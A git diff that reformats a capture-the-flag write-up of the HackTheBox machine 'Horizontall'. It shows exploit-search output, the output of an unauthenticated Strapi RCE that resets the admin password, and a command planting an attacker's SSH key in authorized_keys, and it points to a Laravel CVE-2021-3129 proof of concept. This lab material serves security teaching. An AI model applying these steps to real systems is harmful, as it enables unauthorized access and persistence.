@@ -206,13 +206,13 @@ Checking Exploit-DB reveals an unauthenticated RCE:
 ```text
 ┌──(root💀kali)-[~/htb/horizontall]
 └─# searchsploit strapi                             
---------------------------------------------------------------------------- ---------------------------------
+--------------------------------------------------------------------------- --------------------------
  Exploit Title                                                             |  Path
---------------------------------------------------------------------------- ---------------------------------
+--------------------------------------------------------------------------- --------------------------
 Strapi 3.0.0-beta - Set Password (Unauthenticated)                         | multiple/webapps/50237.py
 Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)       | multiple/webapps/50238.py
 Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py
---------------------------------------------------------------------------- ---------------------------------
+--------------------------------------------------------------------------- --------------------------
 ```
 
 Let's grab that last exploit and have a look:
@@ -241,7 +241,7 @@ Reading the script we just execute it and point at the website:
 [+] Password reset was successfully
 [+] Your email is: admin@horizontall.htb
 [+] Your new credentials are: admin:SuperStrongPassword1
-[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMzMDE2MjMyLCJleHAiOjE2MzU2MDgyMzJ9.yd3UIWlfe9-JzAs1O5StFBbP_NN0yBdhTRswArk82os
+[+] Your authenticated JSON Web Token: eyJhbGci<SNIP>swArk82os
 $>
 ```
 
@@ -365,14 +365,14 @@ I could have found this much quicker by just using netstat:
 ```text
 strapi@horizontall:~/myapi$ netstat -pentul
 Active Internet connections (only servers)
-Proto Recv-Q Send-Q Local Address      Foreign Address   State     User   Inode    PID/Program name    
-tcp        0      0 0.0.0.0:80         0.0.0.0:*         LISTEN    0      28138    -                   
-tcp        0      0 0.0.0.0:22         0.0.0.0:*         LISTEN    0      26624    -                   
-tcp        0      0 127.0.0.1:1337     0.0.0.0:*         LISTEN    1001   33273    1830/node /usr/bin/ 
-tcp        0      0 127.0.0.1:8000     0.0.0.0:*         LISTEN    0      35123    -                   
-tcp        0      0 127.0.0.1:3306     0.0.0.0:*         LISTEN    111    30010    -                   
-tcp6       0      0 :::80              :::*              LISTEN    0      28139    -                   
-tcp6       0      0 :::22              :::*              LISTEN    0      28683    -     
+Proto Recv-Q Send-Q Local Address   Foreign Address   State     User   Inode    PID/Program name    
+tcp        0      0 0.0.0.0:80      0.0.0.0:*         LISTEN    0      28138    -                   
+tcp        0      0 0.0.0.0:22      0.0.0.0:*         LISTEN    0      26624    -                   
+tcp        0      0 127.0.0.1:1337  0.0.0.0:*         LISTEN    1001   33273    1830/node /usr/bin/ 
+tcp        0      0 127.0.0.1:8000  0.0.0.0:*         LISTEN    0      35123    -                   
+tcp        0      0 127.0.0.1:3306  0.0.0.0:*         LISTEN    111    30010    -                   
+tcp6       0      0 :::80           :::*              LISTEN    0      28139    -                   
+tcp6       0      0 :::22           :::*              LISTEN    0      28683    -     
 ```
 
 ## Laravel Detection
@@ -444,14 +444,16 @@ The key's randomart image is:
 Take the public key and create an echo statement that we can paste on the box:
 
 ```text
-echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8EvKu+pSGQwdANMmazDgzTRXzmk3LyT+WxaKurXTjFZY8Rrl9OQ1K05WM1aEKQybhO0J/Fh1U0dd0QNa+nof5vWQQZisdq2jfUk1V0h6LMQiUyYpN8nxw0lQ4Dl0EEER/BWYkVKbS0PxthcT+jME6Prc5IQCQ5JYxK1qeHycvF+2ppD+Zem4Q7ifVvYkKgNPAdmXGgV2jaR8jq6PnauZSkh+KSg5i2uQ2AkepdsOb9HIjZFni+GVPVq/Ik/NLH+kMJFMj4Jej7dxD5+FmZpvDeh3qJobqH/xUaDAh3Zfrk1HahSo7dVpggzDPcLsFK8pPTYQM//S5s/n3AHHJuBdSvMQXBkJ5q3JD+midSFT7lTtzxFgqUddRjcs+Rz7wOWdhx95UNiNgBnYrPu06ha1MmyZMTTQHKha43dQ9oHgeOmKMI7or7WaAqTMNwfg65a2yHjCegYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8E<SNIP>
+gYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
 ```
 
 This is just echoing the contents of the id_rsa.pub file to a file called authorized_keys. Copy this to the clipboard and then switch back to the box:
 
 ```text
 strapi@horizontall:~$ cd .ssh/
-strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8EvKu+pSGQwdANMmazDgzTRXzmk3LyT+WxaKurXTjFZY8Rrl9OQ1K05WM1aEKQybhO0J/Fh1U0dd0QNa+nof5vWQQZisdq2jfUk1V0h6LMQiUyYpN8nxw0lQ4Dl0EEER/BWYkVKbS0PxthcT+jME6Prc5IQCQ5JYxK1qeHycvF+2ppD+Zem4Q7ifVvYkKgNPAdmXGgV2jaR8jq6PnauZSkh+KSg5i2uQ2AkepdsOb9HIjZFni+GVPVq/Ik/NLH+kMJFMj4Jej7dxD5+FmZpvDeh3qJobqH/xUaDAh3Zfrk1HahSo7dVpggzDPcLsFK8pPTYQM//S5s/n3AHHJuBdSvMQXBkJ5q3JD+midSFT7lTtzxFgqUddRjcs+Rz7wOWdhx95UNiNgBnYrPu06ha1MmyZMTTQHKha43dQ9oHgeOmKMI7or7WaAqTMNwfg65a2yHjCegYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
+strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDg0PqOGRanCQeaQ8E<SNIP>
+gYbDv/iV4j/BDTJCrtfwlbskA0qveVguz15rTc09Fr4NE= root@kali" >> authorized_keys
 ```
 
 With the public key from Kali in the authorized_keys file on the box we can now SSH in as the user strapi setting up port forwarding at the same time:
@@ -477,7 +479,10 @@ The above command is simply saying any traffic received locally on port 8000 for
 Looking at the site we can confirm it's running Laravel v8 (PHP v7.4.18). A search for an exploit finds [this](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3129) CVE which says:
 
 ```text
-Ignition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2.
+Ignition before 2.5.2, as used in Laravel and other products,
+allows unauthenticated remote attackers to execute arbitrary code 
+because of insecure usage of file_get_contents() and file_put_contents().
+This is exploitable on sites using debug mode with Laravel before 8.4.2.
 ```
 
 We are on a version prior to 8.4.2, a look on GitHub finds [this](https://github.com/nth347/CVE-2021-3129_exploit) POC. We simply clone and run it against the box, let's try it:
